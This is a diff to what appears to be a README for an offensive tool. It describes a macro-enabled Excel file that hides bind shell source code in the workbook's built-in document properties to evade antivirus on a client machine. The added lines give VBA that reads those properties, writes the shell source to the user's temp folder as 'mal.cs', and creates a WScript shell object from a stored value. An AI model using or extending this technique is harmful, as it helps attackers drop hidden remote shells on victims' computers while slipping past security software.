@@ -14,6 +14,19 @@ The requirement was to bypass a note AV software installed on a client machine. 
 ![Screenshot](screen/run.png)
 ###### *The logic*
 * I embedded the source code of the bind shell in the comment property of the Excel file Here the link to the MS doc: https://docs.microsoft.com/en-us/dotnet/api/microsoft.office.tools.excel.workbook.builtindocumentproperties?view=vsto-2017 and I retrived the value in the VBA script as follows:<br>
-`var = ActiveWorkbook.BuiltinDocumentProperties(5)`<br> I used the same technique to get the port that is parametric and to initialize the wscript shell object<br>
+`var = ActiveWorkbook.BuiltinDocumentProperties(5)`<br>
+I used a file system object to write the source code of the shell to the user temp folder
+`Dim path As String
+    path = Environ("Temp")
+            
+    Dim FSO As Object
+    Set FSO = CreateObject("Scripting.FileSystemObject")
+    Dim oFile As Object
+    
+    Set oFile = FSO.CreateTextFile(path & "\mal.cs")`
+* I used the same technique to get the port that is parametric and to initialize the wscript shell object<br>
 ![Screenshot](screen/propxlsm.png)
+<br>`shellObj = ActiveWorkbook.BuiltinDocumentProperties(4)`
+<br>`wSo = CreateObject(shellObj)`
+
 
